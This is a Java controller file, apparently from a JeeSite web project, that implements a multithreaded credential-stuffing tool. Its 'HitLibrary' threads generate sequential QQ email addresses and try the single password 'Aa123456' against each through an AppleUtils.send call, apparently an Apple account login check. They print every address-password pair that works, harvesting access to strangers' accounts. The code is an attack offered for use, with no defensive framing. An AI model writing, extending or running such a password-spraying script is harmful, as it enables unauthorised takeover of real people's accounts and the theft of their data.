package com.thinkgem.jeesite.modules.imessage.web;

import com.thinkgem.jeesite.modules.imessage.service.HcAppleService;
import com.thinkgem.jeesite.modules.imessage.utils.AppleUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.annotation.PostConstruct;

/**
 * Created by Administrator on 2016/11/29.
 */
@Controller
@RequestMapping(value = "${adminPath}/imessage/scan")
public class AppleController {

    @Autowired
    private HcAppleService hcAppleService;

    @PostConstruct
    public void init() {
        String QQ = "11360";
        int scanNumber = 10;
        int qqPlace = 9;
        int number = (int) Math.pow(10, qqPlace - QQ.length());

        System.out.println(number);

    }

    public static void main(String[] args) {
        String QQ = "11362";
        int scanNumber = 10;
        int qqPlace = 9;
        int number = (int) Math.pow(10, qqPlace - QQ.length());

        int threadNumber = number / 10;
        for (int i = 0; i < scanNumber; i++) {
            int max = threadNumber * i;
            HitLibrary hitLibrary = new HitLibrary(QQ, threadNumber, max, qqPlace);
            hitLibrary.start();
        }
    }

    static class HitLibrary extends Thread {
        private String QQprefix;
        private int threadNumber;
        private int startNumber;
        private int QQplace;

        public HitLibrary(String QQprefix, int threadNumber, int startNumber, int QQplace) {
            this.QQprefix = QQprefix;
            this.threadNumber = threadNumber;
            this.startNumber = startNumber;
            this.QQplace = QQplace;
        }

        public void run() {
            int balance = QQplace - QQprefix.length();
            String password = "Aa123456";
            AppleUtils apple = new AppleUtils();
            for (int i = 1 ; i<= threadNumber; i++) {
                String newString = QQprefix+ String.format("%0" + balance + "d", startNumber);
                newString += "@qq.com";
                if (apple.send(newString, password)) {
                    System.out.println(newString + "----" + password);
                }
                startNumber++;
                try {
                    sleep(1000);
                } catch (InterruptedException e) {
                   // e.printStackTrace();
                }
            }
        }
    }

}
